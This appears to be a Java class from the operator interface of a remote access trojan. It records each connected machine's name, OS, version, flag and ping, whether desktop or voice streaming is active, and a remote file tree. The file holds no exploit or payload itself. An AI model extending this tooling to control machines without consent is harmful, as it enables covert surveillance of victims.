package de.sogomn.rat.server.gui;

import javax.swing.ImageIcon;

import de.sogomn.rat.ActiveConnection;

final class ServerClient {
	
	private boolean loggedIn;
	
	private String name, os, version;
	private ImageIcon flag;
	private boolean streamingDesktop, streamingVoice;
	private long ping;
	
	public final ActiveConnection connection;
	public final DisplayPanel displayPanel;
	public final FileTree fileTree;
	
	public ServerClient(final ActiveConnection connection) {
		this.connection = connection;
		
		displayPanel = new DisplayPanel(this);
		fileTree = new FileTree(this);
	}
	
	public void logIn(final String name, final String os, final String version, final ImageIcon flag) {
		this.name = name;
		this.os = os;
		this.version = version;
		this.flag = flag;
		
		final String title = name + " " + getAddress();
		
		displayPanel.setTitle(title);
		fileTree.setTitle(title);
		
		loggedIn = true;
	}
	
	public void addListener(final IGuiController controller) {
		displayPanel.addListener(controller);
		fileTree.addListener(controller);
	}
	
	public void removeListener(final IGuiController controller) {
		displayPanel.removeListener(controller);
		fileTree.removeListener(controller);
	}
	
	public void setStreamingDesktop(final boolean streamingDesktop) {
		this.streamingDesktop = streamingDesktop;
	}
	
	public void setStreamingVoice(final boolean streamingVoice) {
		this.streamingVoice = streamingVoice;
	}
	
	public void setPing(final long ping) {
		this.ping = ping;
	}
	
	public String getName() {
		return name;
	}
	
	public ImageIcon getFlag() {
		return flag;
	}
	
	public String getAddress() {
		return connection.getAddress();
	}
	
	public String getOs() {
		return os;
	}
	
	public String getVersion() {
		return version;
	}
	
	public boolean isLoggedIn() {
		return loggedIn;
	}
	
	public boolean isStreamingDesktop() {
		return streamingDesktop;
	}
	
	public boolean isStreamingVoice() {
		return streamingVoice;
	}
	
	public long getPing() {
		return ping;
	}
	
}
